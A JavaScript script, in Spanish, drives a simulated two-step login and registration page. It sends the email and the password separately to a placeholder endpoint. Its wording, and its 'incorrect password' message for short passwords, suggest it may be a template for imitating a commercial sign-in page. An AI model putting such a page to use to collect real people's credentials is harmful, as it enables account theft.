// Estado de la aplicación
let currentUser = null;

// Elementos del DOM
const loginForm = document.getElementById('loginForm');
const passwordForm = document.getElementById('passwordForm');
const registerForm = document.getElementById('registerForm');
const loginFormElement = document.getElementById('loginFormElement');
const passwordFormElement = document.getElementById('passwordFormElement');
const registerFormElement = document.getElementById('registerFormElement');

// Mostrar/ocultar formularios
function showLoginForm() {
    loginForm.classList.remove('hidden');
    passwordForm.classList.add('hidden');
    registerForm.classList.add('hidden');
    clearErrors();
}

function showPasswordForm(email) {
    loginForm.classList.add('hidden');
    passwordForm.classList.remove('hidden');
    registerForm.classList.add('hidden');
    document.getElementById('userEmail').textContent = email;
    clearErrors();
}

function showRegisterForm() {
    loginForm.classList.add('hidden');
    passwordForm.classList.add('hidden');
    registerForm.classList.remove('hidden');
    clearErrors();
}

// Limpiar errores
function clearErrors() {
    document.getElementById('loginError').classList.add('hidden');
    document.getElementById('passwordError').classList.add('hidden');
    document.getElementById('registerError').classList.add('hidden');
}

// Mostrar errores
function showError(formType, message) {
    const errorElement = document.getElementById(formType + 'Error');
    const errorTextElement = document.getElementById(formType + 'ErrorText');

    if (errorTextElement) {
        errorTextElement.textContent = message;
    }
    errorElement.classList.remove('hidden');
}

function showRegisterErrors(errors) {
    const errorElement = document.getElementById('registerError');
    const errorList = document.getElementById('registerErrorList');

    errorList.innerHTML = '';
    errors.forEach(error => {
        const li = document.createElement('li');
        li.textContent = error;
        errorList.appendChild(li);
    });

    errorElement.classList.remove('hidden');
}

// Validar email
function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

// Validar teléfono (formato simple)
function isValidPhone(phone) {
    const phoneRegex = /^[\+]?[1-9][\d]{0,15}$/;
    return phoneRegex.test(phone.replace(/\s/g, ''));
}

// Toggle password visibility
function togglePassword() {
    const passwordInput = document.getElementById('password');
    const toggleText = document.querySelector('.show-password');

    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        toggleText.textContent = 'Ocultar contraseña';
    } else {
        passwordInput.type = 'password';
        toggleText.textContent = 'Mostrar contraseña';
    }
}

// Event Listeners
loginFormElement.addEventListener('submit', function (e) {
    e.preventDefault();

    const email = document.getElementById('email').value.trim();

    if (!email) {
        showError('login', 'Introduce tu email o número de teléfono móvil');
        return;
    }

    if (!isValidEmail(email) && !isValidPhone(email)) {
        showError('login', 'Introduce un email o número de teléfono móvil válido');
        return;
    }

    fetch('URL_DEL_ENDPOINT', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ 'email': email })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Error en la solicitud');
        }
        return response.json();
    })
    .then(data => {
        if (data.success) {
            currentUser = email;
            showPasswordForm(email);
        } else {
            showError('login', data.message || 'Error en la autenticación');
        }
    })
    .catch(error => {
        showError('login', error.message);
    });
});

passwordFormElement.addEventListener('submit', function (e) {
    e.preventDefault();

    const password = document.getElementById('password').value;

    if (!password) {
        showError('password', 'Introduce tu contraseña');
        return;
    }

    if (password.length < 6) {
        showError('password', 'Tu contraseña es incorrecta');
        return;
    }

    fetch('URL_DEL_ENDPOINT', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ 'password': password })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Error en la solicitud');
        }
        return response.json();
    })
    .then(data => {
        if (data.success) {
            alert('¡Inicio de sesión exitoso! (Esta es una simulación)');
            // Aquí normalmente redirigirías al usuario
        } else {
            showError('password', data.message || 'Error en la autenticación');
        }
    })
    .catch(error => {
        showError('password', error.message);
    });
});

registerFormElement.addEventListener('submit', function (e) {
    e.preventDefault();

    const name = document.getElementById('registerName').value.trim();
    const email = document.getElementById('registerEmail').value.trim();
    const password = document.getElementById('registerPassword').value;
    const passwordConfirm = document.getElementById('registerPasswordConfirm').value;

    const errors = [];

    if (!name) {
        errors.push('Introduce tu nombre');
    }

    if (!email) {
        errors.push('Introduce tu email o número de teléfono móvil');
    } else if (!isValidEmail(email) && !isValidPhone(email)) {
        errors.push('Introduce un email o número de teléfono móvil válido');
    }

    if (!password) {
        errors.push('Introduce tu contraseña');
    } else if (password.length < 6) {
        errors.push('Las contraseñas deben tener al menos 6 caracteres');
    }

    if (!passwordConfirm) {
        errors.push('Confirma tu contraseña');
    } else if (password !== passwordConfirm) {
        errors.push('Las contraseñas no coinciden');
    }

    if (errors.length > 0) {
        showRegisterErrors(errors);
        return;
    }

    // Simular registro
    setTimeout(() => {
        alert('¡Cuenta creada exitosamente! (Esta es una simulación)');
        showLoginForm();
    }, 500);
});

// Cambiar email
document.getElementById('changeEmail').addEventListener('click', function (e) {
    e.preventDefault();
    showLoginForm();
});

// Inicializar
showLoginForm();

